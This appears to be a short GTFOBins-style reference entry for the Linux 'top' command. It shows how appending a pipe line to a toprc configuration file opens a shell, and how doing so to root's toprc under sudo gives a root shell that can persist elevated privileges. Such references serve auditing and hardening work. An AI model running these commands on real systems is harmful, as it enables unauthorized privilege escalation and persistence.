shell.code:
echo -e 'pipe\tx\texec /bin/sh 1>&0 2>&0' >>~/.config/procps/toprc
top
# press return twice
reset

sudo.description: This requires that the root configuration file is writable and might be used to persist elevated privileges.
sudo.code:
echo -e 'pipe\tx\texec /bin/sh 1>&0 2>&0' >>/root/.config/procps/toprc
sudo top
# press return twice
reset
